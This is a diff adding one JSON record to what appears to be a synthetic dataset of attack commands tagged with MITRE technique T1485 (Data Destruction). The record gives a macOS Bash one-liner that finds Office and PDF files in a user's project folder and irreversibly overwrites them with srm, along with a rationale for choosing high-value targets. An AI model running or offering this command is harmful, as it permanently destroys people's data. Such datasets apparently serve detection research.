@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "find \"/Users/alice/Documents/Projects/Alpha\" -type f \\( -name \"*.docx\" -o -name \"*.xlsx\" -o -name \"*.pdf\" \\) -exec srm -fP {} +",
+  "explanation": "Selectively and permanently destroys key document formats within a single project directory.",
+  "rationale_steps": [
+    "Limit destruction to one project path and specific high-value extensions.",
+    "Use find to precisely target files and avoid directories.",
+    "Apply srm with -P for multi-pass overwrite and -f to force deletion."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-80ac6802",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
